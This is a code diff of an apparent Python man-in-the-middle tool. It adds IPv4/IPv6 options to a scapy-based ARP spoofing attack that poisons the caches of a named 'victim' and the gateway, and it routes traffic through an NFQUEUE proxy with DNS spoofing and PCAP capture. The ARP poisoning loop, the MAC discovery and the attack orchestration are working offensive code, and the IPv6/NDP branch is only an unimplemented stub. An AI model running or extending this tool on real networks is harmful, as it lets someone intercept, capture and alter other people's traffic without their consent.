@@ -1,6 +1,7 @@
 import socket
 import os
 import scapy.all as scapy
+from scapy.layers.inet6 import neighsol
 import argparse
 import errno
 import sys
@@ -19,12 +20,15 @@ DOH_BLOCKED_SERVERS = [
     '8.8.4.4'
 ]
 
-def get_mac(ip_addr, interface):
+def get_mac_arp(ip_addr, interface):
     eth_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     arp_packet = scapy.ARP(pdst = ip_addr)
     ans, unans = scapy.srp(eth_packet / arp_packet, timeout = 2, iface = interface, inter = 0.1)
     for snd,rcv in ans:
         return rcv.sprintf(r"%Ether.src%")
+    
+def get_mac_ndp(ip_addr, interface):
+    print(scapy.inet6)
 
 def arp_attack(target_ip, gateway_ip, target_mac, gateway_mac, interface):
     print(f"> Target IP: {target_ip}, Target MAC: {target_mac}, Gateway IP: {gateway_ip}, Gateway MAC: {gateway_mac}", flush=True)
@@ -34,17 +38,21 @@ def arp_attack(target_ip, gateway_ip, target_mac, gateway_mac, interface):
 
     while getattr(p, 'is_running', True):
         scapy.send(
-            scapy.ARP(op = 2, 
-                      pdst = target_ip, 
-                      psrc = gateway_ip, 
-                      hwdst = target_mac
-            ), iface=interface)
+            scapy.ARP(
+                op = 2, 
+                pdst = target_ip, 
+                psrc = gateway_ip, 
+                hwdst = target_mac
+            ), iface=interface
+        )
         scapy.send(
-            scapy.ARP(op = 2, 
-                      pdst = gateway_ip, 
-                      psrc = target_ip, 
-                      hwdst = gateway_mac
-            ), iface=interface)
+            scapy.ARP(
+                op = 2, 
+                pdst = gateway_ip, 
+                psrc = target_ip, 
+                hwdst = gateway_mac
+            ), iface=interface
+        )
 
 def arp_cleanup(target_ip, gateway_ip, target_mac, gateway_mac, interface):
     print("> Cleaning up ARP spoofing", flush=True)
@@ -281,6 +289,8 @@ if __name__ == "__main__":
     """, nargs='+')
     parser.add_argument('-p', '--pcap', type=str, help='Path to PCAP file of all target traffic')
     parser.add_argument('-np', '--no-prompt', action='store_true', help='Prompt for PCAP path and hostname/IP pairs. Does not disable prompt for interface, must manually set interface command option.')
+    parser.add_argument('-4', '--ipv4', action='store_true', help='Use IPv4 and ARP packets')
+    parser.add_argument('-6', '--ipv6', action='store_true', help='Use IPv6 and NDP')
 
     args = parser.parse_args()
 
@@ -289,6 +299,10 @@ if __name__ == "__main__":
         sys.exit(1)
     if args.gateway is None:
         print("> Gateway IP argument required -g/--gateway. See <prog_name> --help for more info.")
+        sys.exit(1)
+
+    if args.ipv4 and args.ipv6:
+        print("> Cannot use both IPv4 and IPv6, choose one")
         sys.exit(1)
 
     if args.no_prompt and args.pcap is None:
@@ -331,27 +345,32 @@ if __name__ == "__main__":
     interface = args.interface or get_network_adapter()
     init_ip_tables(args.target, args.nf_queue)
 
-    print("> Getting MAC address of gateway and victim")
-    target_mac = get_mac(args.target, interface)
-    gateway_mac = get_mac(args.gateway, interface)
+    if args.ipv4:
+        print("> Using IPv4 and ARP packets")
+        print("> Getting MAC address of gateway and victim")
+        target_mac = get_mac_arp(args.target, interface)
+        gateway_mac = get_mac_arp(args.gateway, interface)
 
-    arp_process = mp.Process(target=arp_attack, args = (args.target, args.gateway, target_mac, gateway_mac, interface), daemon=True)
-    mitm_process = mp.Process(target=mitm_proxy, args = (interface, args.target, spoof_map, pcap_path), daemon=True)
-    
-    try:
-        arp_process.start()
-        mitm_process.start()
+        arp_process = mp.Process(target=arp_attack, args = (args.target, args.gateway, target_mac, gateway_mac, interface), daemon=True)
+        mitm_process = mp.Process(target=mitm_proxy, args = (interface, args.target, spoof_map, pcap_path), daemon=True)
+        
+        try:
+            arp_process.start()
+            mitm_process.start()
 
-        print("> Enter ctrl+c to quit. Wait for cleanup to ensure ARP attack is disabled properly")
-        while True:
-            ...
+            print("> Enter ctrl+c to quit. Wait for cleanup to ensure ARP attack is disabled properly")
+            while True:
+                ...
 
-    except KeyboardInterrupt:
-        print("> Received ctrl+c, exiting")
-        arp_process.is_running = False
-        mitm_process.is_running = False
-        arp_process.join()
-        mitm_process.join()
+        except KeyboardInterrupt:
+            print("> Received ctrl+c, exiting")
+            arp_process.is_running = False
+            mitm_process.is_running = False
+            arp_process.join()
+            mitm_process.join()
 
-    arp_cleanup(args.target, args.gateway, target_mac, gateway_mac, interface)
+        arp_cleanup(args.target, args.gateway, target_mac, gateway_mac, interface)
+    else:
+        print("> Using IPv6 and NDP packets")
+        print("> Not implemented yet")
     destroy_ip_tables()
